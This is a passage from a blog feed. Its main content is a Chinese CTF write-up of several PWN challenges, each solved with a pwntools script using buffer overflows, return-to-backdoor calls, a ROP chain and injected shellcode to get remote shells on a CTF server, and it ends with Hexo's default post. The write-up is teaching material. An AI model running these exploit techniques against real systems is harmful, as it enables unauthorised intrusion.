flag_str)</span><br><span class="line"><span class="comment">#得到flag--Decrypted Password: flag&#123;62341970df8bd80a5b92a7098cac39b6&#125;</span></span><br></pre></td></tr></table></figure><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><p>pwn题目的基本步骤先用file 和checksec看一下文件，然后放到ida中分析，然后调试，写py脚本</p><h3 id="sandbox"><a href="#sandbox" class="headerlink" title="sandbox"></a>sandbox</h3><p>首先分析一下源码，在main()函数中发现了box()函数，进去看一下，发现了有if语句对输入的buf进行了判断，然后发现字符串中没有/bin/sh,那应该是用<code>$0</code>了</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-05 18.59.56.png" alt="截屏2025-03-05 18.59.56" style="zoom:50%;" /></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-05 19.01.15.png" alt="截屏2025-03-05 19.01.15" style="zoom:50%;" /></p><p>那么编写py脚本,得到flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./sandbox&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;1.95.36.136&#x27;</span>,<span class="number">2147</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;$0&#x27;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="creeper"><a href="#creeper" class="headerlink" title="creeper"></a>creeper</h3><p>分析到该文件是64位的，在main函数中有一个game函数，发现read函数读取buf，然后if去比较buf的长度是否等于15，如果等于15就会输出flag</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-05 20.14.03.png" alt="截屏2025-03-05 20.14.03" style="zoom:50%;" /></p><p>直接编写py脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./creeper&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;1.95.36.136&#x27;</span>,<span class="number">2088</span>)</span><br><span class="line">padding = <span class="number">0x40</span> +<span class="number">8</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">14</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="简单溢出"><a href="#简单溢出" class="headerlink" title="简单溢出"></a>简单溢出</h3><p>分析main函数发现只有一个输入，根据题目，肯定是溢出发现有<code>/bin/sh</code>字符串，然后通过查看该字符串发现了后门函数fact</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-05 20.53.51.png" alt="截屏2025-03-05 20.53.51" style="zoom:50%;" /></p><p>直接构造payload,得到flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./hahaha&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;1.95.36.136&#x27;</span>,<span class="number">2122</span>)</span><br><span class="line">padding = <span class="number">0x30</span> + <span class="number">8</span> </span><br><span class="line">fact_addr = <span class="number">0x400596</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * padding + p64(fact_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="Emm"><a href="#Emm" class="headerlink" title="Emm"></a>Emm</h3><p>该文件为32位，并且通过ida发现存在flag函数内容是<code>cat flag</code>,那么直接构造</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-05 21.46.53.png" alt="截屏2025-03-05 21.46.53" style="zoom:50%;" /></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./emm&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;1.95.36.136&#x27;</span>,<span class="number">2078</span>)</span><br><span class="line">padding = <span class="number">0x58</span> + <span class="number">4</span></span><br><span class="line"></span><br><span class="line">flag_addr = <span class="number">0x080484CB</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * padding +  p32(flag_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()     </span><br></pre></td></tr></table></figure><h3 id="Choice"><a href="#Choice" class="headerlink" title="Choice"></a>Choice</h3><p>通过分析，发现了经典后门函数Shell，可以直接构造调用了,然后找一下如何进行栈溢出来调用这个shell函数</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-05 21.50.52.png" alt="截屏2025-03-05 21.50.52"></p><p>通过发现Data1()和Data2()两个函数满足栈溢出条件，但是不满足攻击条件</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-05 22.22.40.png" alt="截屏2025-03-05 22.22.40" style="zoom:50%;" /><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-05 22.22.59.png" alt="截屏2025-03-05 22.22.40" style="zoom:50%;" /></p><p>发现Data3()满足栈溢出的攻击攻击条件</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-05 22.24.38.png" alt="截屏2025-03-05 22.24.38" style="zoom:50%;" /></p><p>通过代码，发现要先运行main函数输入3才能进入Data3函数，所以写脚本的时候要先发送一个3</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-05 22.25.54.png" alt="截屏2025-03-05 22.25.54" style="zoom:50%;" /></p><p>构造payload，得到flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./Choice&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;1.95.36.136&#x27;</span>,<span class="number">2077</span>)</span><br><span class="line">padding = <span class="number">0x30</span> + <span class="number">8</span></span><br><span class="line"></span><br><span class="line">shell_addr = <span class="number">0x4007BD</span></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Menu:\n&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>) <span class="comment">#先发送3来进入Data3函数</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * padding + p64(shell_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="overload1"><a href="#overload1" class="headerlink" title="overload1"></a>overload1</h3><p>在main函数中看到了后门函数，那么看看如何能运行到这个函数，分析一下，首先输入v5的值，然后与y进行比较，等于y进入后输入v4的值，最后会用v5的1去与a比较，那么根据题目overload，应该是v4把v5给覆盖了，通过地址看出来的</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-05 23.15.15.png" alt="截屏2025-03-05 23.15.15" style="zoom:50%;" /></p><p>构造payload,来获得flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./overload1&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;1.95.36.136&#x27;</span>,<span class="number">2091</span>)</span><br><span class="line">padding = <span class="number">0x110</span> + <span class="number">8</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;y/n\n&#x27;</span>,<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * padding</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h3><p>通过源码分析，有/bin/sh还有shell函数，那么拼接一下就可以了，主函数中有function函数有一个读取，根据文件为64位，那么payload应该是rdi占满后加上system(“/bin/sh”)</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-05 23.33.47.png" alt="截屏2025-03-05 23.33.47" style="zoom:50%;" /><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-05 23.34.05.png" alt="截屏2025-03-05 23.34.05" style="zoom:50%;" /></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-05 23.34.25.png" alt="截屏2025-03-05 23.34.25" style="zoom:50%;" /></p><p>构造一下payload,得到flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./x64&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;1.95.36.136&#x27;</span>,<span class="number">2083</span>)</span><br><span class="line">padding = <span class="number">0x80</span> + <span class="number">8</span></span><br><span class="line">binsh_addr = <span class="number">0x601060</span></span><br><span class="line"></span><br><span class="line">shell_addr = <span class="number">0x4006B6</span></span><br><span class="line">rdi_addr = <span class="number">0x4007e3</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * padding + p64(rdi_addr) + p64(binsh_addr) + p64(shell_addr)</span><br><span class="line"><span class="comment">#64位的参数从左到右放入寄存器：RDI, RSI, RDX, ECX, R8, R9，之后跟32位一样，找出溢出偏移量、进入function函数中、覆盖返回地址为shell 将/bin/sh作为参数传入</span></span><br><span class="line"><span class="comment"># 还差一个rdi地址</span></span><br><span class="line"><span class="comment"># 使用命令：</span></span><br><span class="line"><span class="comment"># ROPgadget --binary x64 --only &quot;pop|ret&quot;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-05 23.38.44.png" alt="截屏2025-03-05 23.38.44" style="zoom:50%;" /></p><h3 id="你是大佬还是菜鸡"><a href="#你是大佬还是菜鸡" class="headerlink" title="你是大佬还是菜鸡"></a>你是大佬还是菜鸡</h3><p>通过分析源码，得到当输入2的时候会进入Caiji函数，进而读取buf，来进行溢出漏洞，通过搜索发现hint函数是经典的后门函数</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-06 10.22.11.png" alt="截屏2025-03-06 10.22.11" style="zoom:50%;" /><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-06 10.22.39.png" alt="截屏2025-03-06 10.22.39" style="zoom:50%;" /><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-06 10.23.09.png" alt="截屏2025-03-06 10.23.09" style="zoom:50%;" /></p><p>需要通过payload调用hint函数的地址，让caiji函数读取进而得到shell</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn1&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;1.95.36.136&#x27;</span>,<span class="number">2070</span>)</span><br><span class="line">padding = <span class="number">0x20</span> + <span class="number">8</span></span><br><span class="line">hint_addr = <span class="number">0x4008b0</span></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Ji\n&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>) <span class="comment">#先发送2来进入caiji函数，来进行溢出漏洞</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * padding + p64(hint_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="Easy-ShellCode"><a href="#Easy-ShellCode" class="headerlink" title="Easy_ShellCode"></a>Easy_ShellCode</h3><p>通过分析源码，发现main函数中有一个Start函数，但是通过字符串搜索没有发现<code>/bin/sh</code>那么就需要自己写shellcode了，后来发现这个start函数有两次输入，第一次读取的是str变量，发现他在bss段，那么就可以把shellcode放到这里，然后第二次读取buf的时候进行溢出，去调取bss的地址也就是bss_addr</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-06 14.27.56.png" alt="截屏2025-03-06 14.27.56" style="zoom:50%;" /></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-06 14.28.13.png" alt="截屏2025-03-06 14.28.13" style="zoom:50%;" /></p><p>有思路了，那就构造payload，获得flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./Easy_ShellCode&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;1.95.36.136&#x27;</span>,<span class="number">2102</span>)</span><br><span class="line">padding = <span class="number">0x68</span> + <span class="number">4</span></span><br><span class="line">bss_addr = <span class="number">0x804A080</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Input:\n&#x27;</span>)</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;?:\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * padding + p32(bss_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="play"><a href="#play" class="headerlink" title="play"></a>play</h3><p>分析源码，发现main函数中有一个play函数，然后有两次输入，一次是读取，第二次是gets，那么可以第一次read可以去读shellcode第二次gets去找bss_addr</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-06 15.08.55.png" alt="截屏2025-03-06 15.08.55" style="zoom:50%;" /></p><p>构造payload,得到flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./play&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;1.95.36.136&#x27;</span>, <span class="number">2062</span>)</span><br><span class="line">padding = <span class="number">0x30</span> + <span class="number">8</span></span><br><span class="line">bss_addr = <span class="number">0x6010A0</span></span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;playing.\n&#x27;</span>,shellcode)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * padding  + p64(bss_addr)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;game?\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="CTF" scheme="https://guipi01.github.io/categories/CTF/"/>
    
    
    <category term="CTF" scheme="https://guipi01.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://guipi01.github.io/posts/4a17b156.html"/>
    <id>https://guipi01.github.io/posts/4a17b156.html</id>
    <published>2025-03-24T02:41:01.032Z</published>
    <updated>2025-03-26T10:35:43.247Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="hexo" scheme="https://guipi01.github.io/categories/hexo/"/>
    
    
    <category term="hexo" scheme="https://guipi01.github.io/tags/hexo/"/>
    
  </entry>
  
</feed>
